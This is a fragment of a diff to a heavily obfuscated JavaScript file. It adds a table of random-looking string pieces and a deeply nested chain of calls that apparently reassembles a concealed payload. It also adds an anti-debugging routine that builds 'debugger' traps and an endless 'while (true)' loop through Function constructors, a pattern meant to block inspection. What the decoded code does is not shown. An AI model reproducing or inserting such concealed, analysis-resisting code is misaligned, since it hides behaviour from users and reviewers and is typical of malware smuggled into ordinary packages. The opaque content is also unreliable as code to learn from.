+    zUGmF: "1X9V5kdgdc5f9U9Ueh004t4gdw8Se8aTea1d8Y9y9k8R8Q9R5zbRbd6z70738jfv31eY294C4Mdm085k9q3Z0Ffa0s7i3d6",
+    NjVpL: "C6gdZeebQ7L1Jao6G0R1V1x1betfbdD5f4N0m0D0I6K8X8E7Xex0LeDcFcI9K2GdCdg5u4K78392D2m5J4PddfLcAat3a6m",
+    PPTGk: "629a32dWc36gfB2b3WdU3Iawb61i6r4Xcc9s6s951M3pchc3e1fY4A2bfB4T5Z2K2R57651F4R3v2r7c53fd55ar8Q7u6V2",
+    HbCEs: "1bO0R8D8vcv2d8i3Ya4bjap307W1v3ecw9Db7bw7kff5C0K6KeA6Z3D5PfY2A4S7Nbk9abnaG9X2n17enbabD356Aeqba0E",
+    DqORw: "47fr4V7K0G9e9h206Z2oaB6YfcasbWad167f7ndn8S7Z6z6N3T1zdv5535bi2H2Cejc846dU4V1T3aacdu9n1W8hdEd6aHa",
+    qlfRT: "Fa29H0TbA8Pek86d7c06Add0M0Y7v3z9H9e8dbHeVdfbh6veads989NbW4j0r1Rab4w1rcxbV8R2E3Q371UdTbUey8a4x73",
+    BooEo: "aX3BeDaN6I3R192K6X5H4E6Wbr0WbU1B2h0zdc3g3F5jen4b95cHfv4W0x4Wdk769EeC6p5W41174CaL31bY8cds4z8l9Xe",
+    QOstM: "Vf5bUcsb1293K82bLdJ0cfN5Zdyeu2N148ja09D83ea0C8o9ods8AcXbk3kfm4Efe685P98838kd61Q5L2eaR5rbIfj532u",
+    JGxgj: "dgfy5n49bc5W5dbafO7y9beNbh912T0reV028X1o2jdOaa7abJa47L4Ab45c7ubNbX8z3U0V0ddI8Gc25Seif45dafaD3r0",
+    SpmQG: "Zce1za5f6bX8D1HbH069Tar5Tax570beu0E"
+  };
+  const vV699 = v699;
+  return vV699.PxYMm(vV699.xOAMG(vV699.PxYMm(vV699.MokkO(vV699.eYYpK(vV699.MokkO(vV699.nmZFF(vV699.zrPZF(vV699.rtRrf(vV699.eYYpK(vV699.LCKcX(vV699.xOAMG(vV699.HcgHe(vV699.IgvuH(vV699.tEcMk(vV699.nmZFF(vV699.rryNF(vV699.bdASX(vV699.rryNF(vV699.xOAMG(vV699.qWQke(vV699.rtRrf(vV699.nmZFF(vV699.qWQke(vV699.gNiNc(vV699.bdASX(vV699.xOAMG(vV699.nmZFF(vV699.SXkBw(vV699.DnooP(vV699.eYYpK(vV699.uwvpm(vV699.rryNF(vV699.qWQke(vV699.CvOjo(vV699.uwvpm(vV699.eYYpK(vV699.mqJfz(vV699.VMLpR(vV699.gjaxS(vV699.zACpn(vV699.tEcMk(vV699.VUVFJ(vV699.bgvbP(vV699.tEcMk(vV699.IUwQP(vV699.uwvpm(vV699.SXkBw(vV699.rtRrf(vV699.WjdRg(vV699.DnooP(vV699.ptppH(vV699.VUVFJ(vV699.HcgHe(vV699.ptppH(vV699.bUVpW(vV699.uwvpm(vV699.SbZOt(vV699.gjaxS(vV699.uwvpm(vV699.xOAMG(vV699.ptppH(vV699.wziey(vV699.SXkBw(vV699.kxDib(vV699.ptppH(vV699.AYoWz(vV699.cnfxr(vV699.LCKcX(vV699.uDJSv(vV699.CvOjo(vV699.uDJSv(vV699.ABQij(vV699.BsoRi(vV699.jAQpw(vV699.bgvbP(vV699.yCtXz(vV699.VfECw(vV699.MokkO(vV699.RBrFM(vV699.ONhYG(vV699.MePgo(vV699.BsoRi(vV699.ptppH(vV699.MePgo(vV699.EukWw(vV699.yCtXz(vV699.SuYyO(vV699.QhBEB, vV699.nzPFK), vV699.PKiMy), vV699.fuQsm), vV699.MCFsv), vV699.cLfGX), vV699.bzgZJ), vV699.dpIRl), vV699.lEAGB), vV699.dyOAh), vV699.MYuJw), vV699.IKptn), vV699.OTjqj), vV699.IZDCo), vV699.APRQN), vV699.Qyydm), vV699.DfhQn), vV699.BSMPR), vV699.uMVBo), vV699.eEzXr), vV699.ZbAwl), vV699.mkykp), vV699.AXyYo), vV699.bbDIB), vV699.xgFZF), vV699.mvukK), vV699.GffVT), vV699.uXSja), vV699.cpplU), vV699.hsCoa), vV699.eFTLJ), vV699.ZLXcS), vV699.iApTT), vV699.UEYgz), vV699.SnKdJ), vV699.mJhTl), vV699.EeGLe), vV699.MrWFH), vV699.Ejiet), vV699.KjwwQ), vV699.RyguR), vV699.Ugslr), vV699.HBByV), vV699.wsnxt), vV699.xTnfG), vV699.aCQRu), vV699.EqugI), vV699.bCtnB), vV699.PNqBG), vV699.tlWXf), vV699.KcxHo), vV699.mFRpS), vV699.VgsIp), vV699.oJcbp), vV699.ItZXY), vV699.zAzJk), vV699.axMQJ), vV699.wRSSi), vV699.gMiVu), vV699.SUeyy), vV699.hFjWO), vV699.woMFM), vV699.bPwgS), vV699.LAMzR), vV699.fXMeK), vV699.UTDRF), vV699.KvEdy), vV699.hmmax), vV699.bflFG), vV699.jGOVe), vV699.gYGfJ), vV699.gbJXK), vV699.mlLMk), vV699.VDyej), vV699.goeIw), vV699.mcXdk), vV699.IBFQo), vV699.lDWcn), vV699.sOaaB), vV699.zUGmF), vV699.NjVpL), vV699.PPTGk), vV699.HbCEs), vV699.DqORw), vV699.qlfRT), vV699.BooEo), vV699.QOstM), vV699.JGxgj), vV699.SpmQG);
+}
+f2();
+function f92(p2181) {
+  const v700 = {
+    OYdwi: function (p2182, p2183) {
+      return p2182 === p2183;
+    },
+    LDets: "string",
+    GXGht: "while (true) {}",
+    BlrqS: "counter",
+    JYkDD: function (p2184, p2185) {
+      return p2184 !== p2185;
+    },
+    FEIxI: function (p2186, p2187) {
+      return p2186 + p2187;
+    },
+    SDHPn: function (p2188, p2189) {
+      return p2188 / p2189;
+    },
+    VkpnA: "length",
+    ZtjbZ: function (p2190, p2191) {
+      return p2190 % p2191;
+    },
+    VLGFb: function (p2192, p2193) {
+      return p2192 + p2193;
+    },
+    mwrNQ: "debu",
+    TzQZJ: "gger",
+    UTtaW: "action",
+    tfToP: "stateObject",
+    vDSeB: function (p2194, p2195) {
+      return p2194(p2195);
+    }
+  };
+  function f93(p2196) {
+    if (v700.OYdwi(typeof p2196, v700.LDets)) {
+      return function (p2197) {}.constructor(v700.GXGht).apply(v700.BlrqS);
+    } else if (v700.JYkDD(v700.FEIxI("", v700.SDHPn(p2196, p2196))[v700.VkpnA], 1) || v700.OYdwi(v700.ZtjbZ(p2196, 20), 0)) {
       (function () {
         return true;
-      }).constructor(v684.YQyLu(v684.xrOYn, v684.dDkky)).call(v684.TBEXH);
+      }).constructor(v700.VLGFb(v700.mwrNQ, v700.TzQZJ)).call(v700.UTtaW);
     } else {
       (function () {
         return false;
-      }).constructor(v684.YQyLu(v684.xrOYn, v684.dDkky)).apply(v684.Bdggd);
+      }).constructor(v700.FEIxI(v700.mwrNQ, v700.TzQZJ)).apply(v700.tfToP);
     }
-    v684.dSBrk(f92, ++p2102);
+    v700.vDSeB(f93, ++p2196);
   }
   try {
-    if (p2087) {
-      return f92;
+    if (p2181) {
+      return f93;
     } else {
-      v684.dSBrk(f92, 0);
+      v700.vDSeB(f93, 0);
     }
-  } catch (d) {}
+  } catch (H) {}
 }
